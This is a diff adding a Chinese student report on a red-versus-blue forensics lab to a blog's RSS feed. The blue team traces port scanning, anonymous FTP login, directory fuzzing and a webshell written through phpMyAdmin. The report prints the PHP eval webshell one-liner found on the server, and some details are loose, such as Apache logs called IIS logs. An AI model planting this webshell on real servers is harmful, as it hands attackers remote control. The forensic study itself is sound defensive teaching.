@@ -7,7 +7,576 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>梦幻星河</copyright>
-        <lastBuildDate>Thu, 11 Dec 2025 20:09:57 +0800</lastBuildDate><atom:link href="https://charles-lin-cell.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 03 Aug 2026 18:36:37 +0800</lastBuildDate><atom:link href="https://charles-lin-cell.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>计算机取证技术实训</title>
+        <link>https://charles-lin-cell.github.io/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%AE%AD/</link>
+        <pubDate>Mon, 03 Aug 2026 17:15:50 +0800</pubDate>
+        
+        <guid>https://charles-lin-cell.github.io/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%AE%AD/</guid>
+        <description>&lt;h1 id=&#34;电子与信息工程学院&#34;&gt;电子与信息工程学院
+&lt;/h1&gt;&lt;h2 id=&#34;计算机取证技术实训-课程报告&#34;&gt;计算机取证技术实训 课程报告
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;题　　目：&lt;/strong&gt; 计算机取证技术实训&lt;br&gt;
+&lt;strong&gt;学　　院：&lt;/strong&gt; 电子与信息工程学院&lt;br&gt;
+&lt;strong&gt;专　　业：&lt;/strong&gt; 电子信息工程（信息安全）&lt;br&gt;
+&lt;strong&gt;组　　号：&lt;/strong&gt; 第 2 组&lt;br&gt;
+&lt;strong&gt;任课教师：&lt;/strong&gt; 容振邦&lt;br&gt;
+&lt;strong&gt;起止日期：&lt;/strong&gt; 2025 年 10 月 13 日至 2026 年 1 月 2 日&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;第-1-章背景&#34;&gt;第 1 章　背景
+&lt;/h1&gt;&lt;h2 id=&#34;11-背景&#34;&gt;1.1 背景
+&lt;/h2&gt;&lt;p&gt;在信息化时代，企业 Web 系统是业务运行的核心，但也是网络攻击的主要目标。为了应对非法入侵，企业需通过计算机取证技术还原攻击过程，锁定攻击者身份。&lt;/p&gt;
+&lt;p&gt;本次实训模拟了企业 Web 系统被攻击的场景。蓝队（防守方）的任务是通过流量捕获、日志分析、文件检查和 IP 溯源，形成完整的证据链，最终完成攻击溯源。&lt;/p&gt;
+&lt;h2 id=&#34;12-具体任务概述&#34;&gt;1.2 具体任务概述
+&lt;/h2&gt;&lt;h3 id=&#34;蓝队任务&#34;&gt;蓝队任务
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;全程监控攻击行为：提前部署取证工具，确保攻击发生时能第一时间捕获流量，日志和文件变化。&lt;/li&gt;
+&lt;li&gt;多维度取证：结合网络流量、系统日志、文件内容和 IP 溯源，验证攻击者的每一步操作。&lt;/li&gt;
+&lt;li&gt;攻击溯源：通过 IP 查询平台定位攻击源，确认攻击者地理位置和历史行为。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;红队任务&#34;&gt;红队任务
+&lt;/h3&gt;&lt;p&gt;红队通过以下步骤实施攻击：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用 nmap 扫描目标端口&lt;/li&gt;
+&lt;li&gt;通过 Hydra 爆破 FTP 弱口令&lt;/li&gt;
+&lt;li&gt;利用 ffuf 扫描 Web 敏感目录&lt;/li&gt;
+&lt;li&gt;登录后台并上传 WebShell&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;第-2-章计算机取证技术介绍&#34;&gt;第 2 章　计算机取证技术介绍
+&lt;/h1&gt;&lt;h2 id=&#34;21-主流计算机取证技术概述&#34;&gt;2.1 主流计算机取证技术概述
+&lt;/h2&gt;&lt;p&gt;计算机取证技术是指在合法合规前提下，对计算机系统、网络环境中的攻击痕迹进行识别、收集、保全、分析和呈现的一系列技术方法，主要包括以下类别：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;网络流量取证技术&lt;/strong&gt;：通过捕获网络传输数据包，分析通信双方、传输内容、协议类型等信息，还原网络交互过程，常用工具包括 Wireshark、tcpdump 等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;日志分析取证技术&lt;/strong&gt;：收集操作系统、应用程序、网络设备等产生的日志数据，提取关键操作记录、访问痕迹和异常行为，常用工具包括 Log Parser Lizard、ELK Stack 等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;文件取证技术&lt;/strong&gt;：对系统文件、数据库文件、缓存文件等进行分析，查找被篡改痕迹、恶意文件残留等，常用工具包括 Notepad++、WinHex 等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;IP 溯源技术&lt;/strong&gt;：通过 IP 地址查询其地理位置、运营商、历史行为等信息，定位攻击源头，常用平台包括微步在线、IP138 等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;蜜罐取证技术&lt;/strong&gt;：通过构建模拟目标系统的诱捕环境，吸引攻击方攻击并记录其攻击行为，但本次实训未采用该技术。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;22-本次实训采用的取证技术与工具&#34;&gt;2.2 本次实训采用的取证技术与工具
+&lt;/h2&gt;&lt;p&gt;结合实训场景需求，本次实训重点采用以下技术与工具：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;网络流量取证&lt;/strong&gt;：使用 Wireshark 工具捕获红蓝双方网络交互数据包，通过过滤规则筛选攻击相关流量，还原端口扫描、弱口令爆破、目录扫描等攻击过程。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;日志分析取证&lt;/strong&gt;：通过 Windows 事件查看器提取系统安全日志，使用 Log Parser Lizard 分析 IIS Web 服务器日志，验证攻击方的登录行为和 Web 访问轨迹。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;文件取证&lt;/strong&gt;：利用 Notepad++ 查看恶意文件内容，通过文件属性分析创建时间与攻击时间的关联性，确认攻击遗留证据。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;IP 溯源技术&lt;/strong&gt;：通过微步在线威胁情报平台，查询攻击方 IP 地址的地理位置、运营商信息和历史攻击行为，完成攻击源头定位。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;辅助工具&lt;/strong&gt;：包括 XAMPP（搭建 Web 与数据库环境）、Kali Linux（红方攻击平台）、Dedecms（存在漏洞的 Web 系统）等，为攻防与取证提供环境支撑。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;第-3-章取证过程&#34;&gt;第 3 章　取证过程
+&lt;/h1&gt;&lt;h2 id=&#34;31-网络规划&#34;&gt;3.1 网络规划
+&lt;/h2&gt;&lt;h3 id=&#34;311-网络配置&#34;&gt;3.1.1 网络配置
+&lt;/h3&gt;&lt;p&gt;根据课程要求，本次实训使用 172.3.0.0/16 网段，红蓝双方网络配置如下：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;角色&lt;/th&gt;
+          &lt;th&gt;操作系统&lt;/th&gt;
+          &lt;th&gt;设备类型&lt;/th&gt;
+          &lt;th&gt;IP 地址&lt;/th&gt;
+          &lt;th&gt;子网掩码&lt;/th&gt;
+          &lt;th&gt;网关&lt;/th&gt;
+          &lt;th&gt;DNS&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;蓝队&lt;/td&gt;
+          &lt;td&gt;Windows Server 2019&lt;/td&gt;
+          &lt;td&gt;目标服务器&lt;/td&gt;
+          &lt;td&gt;172.3.200.10&lt;/td&gt;
+          &lt;td&gt;255.255.0.0&lt;/td&gt;
+          &lt;td&gt;无&lt;/td&gt;
+          &lt;td&gt;8.8.8.8&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;红队&lt;/td&gt;
+          &lt;td&gt;Kali Linux&lt;/td&gt;
+          &lt;td&gt;攻击机&lt;/td&gt;
+          &lt;td&gt;172.3.200.20&lt;/td&gt;
+          &lt;td&gt;255.255.0.0&lt;/td&gt;
+          &lt;td&gt;无&lt;/td&gt;
+          &lt;td&gt;默认&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;312-环境搭建过程&#34;&gt;3.1.2 环境搭建过程
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;虚拟机网络模式配置&lt;/strong&gt;：红蓝双方虚拟机均设置为“仅主机模式”，避免外部网络干扰，确保内网互通。&lt;br&gt;
+（Kali 网络适配器配置截图）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c1.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;（Windows Server 2019 网络适配器配置截图）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c2.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c3.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Web 系统搭建&lt;/strong&gt;：蓝队在 Windows Server 2019 上通过 Chocolatey 安装 XAMPP 环境（含 Apache、MySQL、PHP），部署存在弱口令和后台 Getshell 漏洞的 Dedecms 5.7.118 版本，管理员账号 admin，密码 admin。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;FTP 服务配置&lt;/strong&gt;：蓝队在 Windows Server 2019 上搭建 FTP 站点 MyFTPSite，开启匿名登录，放行 21 端口，物理路径为 C:\inetpub\ftproot。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;取证工具安装&lt;/strong&gt;：&lt;br&gt;
+蓝队安装 Wireshark（流量捕获）、Log Parser Lizard（日志分析）、Notepad++（文件查看）等工具；&lt;br&gt;
+红队使用 Kali Linux 自带的 Nmap（端口扫描）、Hydra（弱口令爆破）、Ffuf（目录扫描）等攻击工具。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;连通性验证&lt;/strong&gt;：&lt;br&gt;
+蓝队通过 cmd 执行 &lt;code&gt;ping 172.3.200.20&lt;/code&gt;，红队通过终端执行 &lt;code&gt;ping 172.3.200.10&lt;/code&gt;，双方均显示 0% 丢包率，确认网络互通。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c5.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;313-蓝队取证场景说明&#34;&gt;3.1.3 蓝队取证场景说明
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;预置取证工具：在系统启动后立即部署 Wireshark 和日志监控工具。&lt;/li&gt;
+&lt;li&gt;实时流量捕获：通过 Wireshark 捕获全部网络流量，保存为证据文件。&lt;/li&gt;
+&lt;li&gt;日志监控：持续查看 Windows 安全日志和 IIS 访问日志，发现异常行为。&lt;/li&gt;
+&lt;li&gt;文件检查：定期扫描 Web 目录，识别可疑文件。&lt;/li&gt;
+&lt;li&gt;IP 溯源：攻击结束后立即查询攻击 IP 的地理位置。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;32-网络流量取证&#34;&gt;3.2 网络流量取证
+&lt;/h2&gt;&lt;p&gt;网络流量取证是通过 Wireshark 捕获红蓝双方网络交互数据包，筛选攻击相关流量，还原攻击过程的核心技术。本次实训通过设置针对性过滤规则，精准捕获各攻击阶段的流量数据。&lt;/p&gt;
+&lt;h3 id=&#34;321-流量捕获准备&#34;&gt;3.2.1 流量捕获准备
+&lt;/h3&gt;&lt;p&gt;蓝队启动 Wireshark 工具，选择与红队互通的“以太网”网卡，点击开始捕获按钮，确保攻击过程中全程捕获数据包。捕获完成后，将文件保存为 &lt;code&gt;Attack_traffic.pcap&lt;/code&gt;，作为原始流量证据。&lt;/p&gt;
+&lt;h3 id=&#34;322-端口扫描流量分析&#34;&gt;3.2.2 端口扫描流量分析
+&lt;/h3&gt;&lt;p&gt;蓝队在 Wireshark 中输入过滤规则：&lt;br&gt;
+&lt;code&gt;ip.addr == 172.3.200.20 and tcp.flags.syn == 1&lt;/code&gt;&lt;br&gt;
+筛选 SYN 扫描特征数据包。&lt;br&gt;
+分析结果显示：红队 IP（172.3.200.20）向蓝队 IP（172.3.200.10）的多个端口发送 SYN 请求，其中 80 端口（HTTP 服务）和 21 端口（FTP 服务）返回 SYN-ACK 响应，确认蓝方开放这两个关键服务，与红队扫描结果一致，证明红队实施了端口扫描攻击。&lt;br&gt;
+（蓝队 Wireshark 扫描结果截图）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c7.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;323-ftp-爆破流量分析&#34;&gt;3.2.3 FTP 爆破流量分析
+&lt;/h3&gt;&lt;p&gt;蓝队在 Wireshark 中输入过滤规则：&lt;br&gt;
+&lt;code&gt;ip.addr == 172.3.200.20 and ftp&lt;/code&gt;&lt;br&gt;
+筛选 FTP 协议流量。&lt;br&gt;
+分析结果显示：捕获到红队发送的 FTP 登录请求数据包，用户名和密码均为 anonymous，且后续数据包显示 “Login successful” 响应，证明红队通过弱口令爆破成功登录 FTP 服务器。该流量证据直接验证了红队的 FTP 爆破行为。&lt;br&gt;
+（蓝队 Wireshark 捕获结果截图）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c9.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;324-web-目录扫描流量分析&#34;&gt;3.2.4 Web 目录扫描流量分析
+&lt;/h3&gt;&lt;p&gt;蓝队在 Wireshark 中输入过滤规则：&lt;br&gt;
+&lt;code&gt;ip.addr == 172.3.200.20 and http.request.method == &amp;quot;GET&amp;quot;&lt;/code&gt;&lt;br&gt;
+筛选红队的 HTTP GET 请求。&lt;br&gt;
+分析结果显示：红队在短时间内发送大量 GET 请求，尝试访问 /dedecms 目录下的不同路径，其中包含 /dede（Dedecms 后台）、/phpmyadmin（数据库管理页）等敏感路径的访问请求，符合目录扫描的特征，证明红队实施了 Web 目录探测攻击。&lt;br&gt;
+（蓝队捕获 ffuf 目录扫描截图）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c13.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;325-sql-写入-shell-流量分析&#34;&gt;3.2.5 SQL 写入 Shell 流量分析
+&lt;/h3&gt;&lt;p&gt;蓝队在 Wireshark 中输入过滤规则：&lt;br&gt;
+&lt;code&gt;ip.addr == 172.3.200.20 and http.request.method == &amp;quot;POST&amp;quot; and http.host == &amp;quot;172.3.200.10/phpmyadmin&amp;quot;&lt;/code&gt;&lt;br&gt;
+筛选相关 POST 请求。&lt;br&gt;
+尽管部分流量被 Windows Defender 拦截，但通过威胁历史记录和后续文件验证，结合捕获到的 phpMyAdmin 访问流量，确认红队通过 POST 请求提交了 SQL 注入语句，成功写入恶意文件。在蓝方 web 目录下面成功找到 webshell.php。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c15.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c16.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;33-系统日志分析取证&#34;&gt;3.3 系统日志分析取证
+&lt;/h2&gt;&lt;p&gt;系统日志分析通过提取操作系统和 Web 服务器的日志记录，验证攻击方的访问行为和操作轨迹，是取证过程的重要环节。本次实训重点分析 Windows 安全日志和 IIS Web 日志。&lt;/p&gt;
+&lt;h3 id=&#34;331-windows-安全日志分析&#34;&gt;3.3.1 Windows 安全日志分析
+&lt;/h3&gt;&lt;p&gt;蓝队打开“事件查看器”（win+R 输入 &lt;code&gt;eventvwr.msc&lt;/code&gt;），展开“Windows 日志 → 安全”，筛选事件 ID 4624（登录成功事件）。&lt;br&gt;
+分析结果显示：存在来源 IP 为 172.3.200.20（红队）的登录记录，登录类型为 5（网络登录），登录时间与红队 FTP 爆破成功时间一致，由于红队采用匿名登录，用户名字段显示为“暂缺”。该日志证据验证了红队通过网络登录蓝队服务器的行为。&lt;br&gt;
+（事件查看器截图）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c17.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;332-iis-web-日志分析&#34;&gt;3.3.2 IIS Web 日志分析
+&lt;/h3&gt;&lt;p&gt;蓝队使用 Log Parser Lizard 工具导入 IIS 日志文件（路径：&lt;code&gt;C:\xampp\apache\logs\access.log&lt;/code&gt;），执行查询语句：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uri&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stem&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\xampp\apache\logs\access.log&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;172.3.200.20&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;筛选红队访问记录。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c18.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c19.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;分析结果显示：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;2025 年 12 月 10 日 17:37:20，红队访问 /dedecms/dede 路径，与后台登录时间一致；&lt;/li&gt;
+&lt;li&gt;同一时间段内，红队多次访问 /phpmyadmin 相关路径，与 SQL 写入 Shell 的攻击步骤吻合；&lt;/li&gt;
+&lt;li&gt;日志中记录了红队使用 Ffuf 工具的访问特征（User-Agent 为 “Fuzz Faster U Fool v2.1.0-dev”），进一步验证了目录扫描行为。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Web 日志完整记录了红队的 Web 访问轨迹，与网络流量取证结果相互印证，形成闭环证据。&lt;/p&gt;
+&lt;h2 id=&#34;34-文件证据提取&#34;&gt;3.4 文件证据提取
+&lt;/h2&gt;&lt;p&gt;文件证据是攻击方遗留的直接证据，通过查找恶意文件、验证文件内容和创建时间，可直接证明攻击行为的实施。本次实训的核心文件证据为红队写入的一句话木马文件。&lt;/p&gt;
+&lt;h3 id=&#34;341-恶意文件查找&#34;&gt;3.4.1 恶意文件查找
+&lt;/h3&gt;&lt;p&gt;蓝队根据流量分析和日志记录，定位 Web 系统根目录 &lt;code&gt;C:\xampp\htdocs\dedecms&lt;/code&gt;，在该目录下发现名为 &lt;code&gt;webshell.php&lt;/code&gt; 的可疑文件，该文件不在 Dedecms 默认文件列表中，疑似红队攻击遗留文件。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c20.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;342-文件内容验证&#34;&gt;3.4.2 文件内容验证
+&lt;/h3&gt;&lt;p&gt;蓝队使用 Notepad++ 打开 &lt;code&gt;webshell.php&lt;/code&gt;，文件内容为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;确认该文件为一句话木马，攻击者可通过蚁剑等工具连接该文件，获取服务器控制权。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c21.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;343-文件属性分析&#34;&gt;3.4.3 文件属性分析
+&lt;/h3&gt;&lt;p&gt;查看 &lt;code&gt;webshell.php&lt;/code&gt; 的属性信息：创建时间为 2025 年 12 月 10 日 21:51:17，与红队执行 SQL 写入 Shell 的时间（21:05 左右）高度吻合，时间差源于系统文件创建延迟和防御软件拦截时间。结合文件内容和创建时间，可直接证明该文件为红队攻击过程中写入的恶意文件。
+（文件属性截图）&lt;/p&gt;
